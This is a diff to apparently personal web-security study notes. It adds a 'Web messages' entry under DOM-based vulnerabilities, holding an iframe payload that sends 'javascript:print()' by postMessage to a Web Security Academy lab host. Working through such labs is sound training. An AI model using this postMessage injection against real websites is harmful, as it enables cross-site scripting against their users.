@@ -96,6 +96,10 @@ xhr.send();
 ### Cross-origin resource sharing (CORS)
 ### Clickjacking
 ### DOM-based vulnerabilities
+#### Web messages
+```
+<iframe src="https://0a890020042f321d8079999700d00075.web-security-academy.net" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+```
 ### WebSockets
 ### Insecure deserialization
 #### Java
